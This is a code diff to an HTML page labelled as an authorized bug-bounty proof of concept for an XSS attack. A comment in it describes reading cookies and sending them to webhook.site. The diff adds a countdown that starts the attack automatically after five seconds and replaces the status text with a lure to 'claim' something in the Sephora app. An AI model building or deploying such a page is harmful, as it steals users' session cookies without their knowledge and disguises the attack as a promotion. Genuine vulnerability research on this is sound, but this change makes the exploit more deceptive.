@@ -35,7 +35,7 @@ h1{font-size:26px;margin:0 0 6px;letter-spacing:2px;color:#fff}
   </div>
 </div>
 
-<div class="status" id="st">等待操作…</div>
+<div class="status" id="st">⏳ <span id="cd">5</span> 秒后自动跳转丝芙兰 APP…（点击按钮立即领取）</div>
 
 <div class="warn">
   ⚠️ 授权安全测试演示页 (SRC PoC)<br>
@@ -47,7 +47,17 @@ h1{font-size:26px;margin:0 0 6px;letter-spacing:2px;color:#fff}
 // ★ 一键 PoC: XSS payload 读 cookie → 出网到 webhook.site
 var WEBHOOK = "32207bb0-fac3-4570-83b5-eb4e1db063f1";
 
+var n = 5;
+var cdTimer = setInterval(function() {
+  n--;
+  var el = document.getElementById('cd');
+  if (el) el.textContent = n;
+  if (n <= 0) { clearInterval(cdTimer); start(); }
+}, 1000);
+
+var started = false;
 function start() {
+  if (started) return; started = true;
   var st = document.getElementById('st');
   st.textContent = "⚡ 正在拉起丝芙兰 APP…";
 
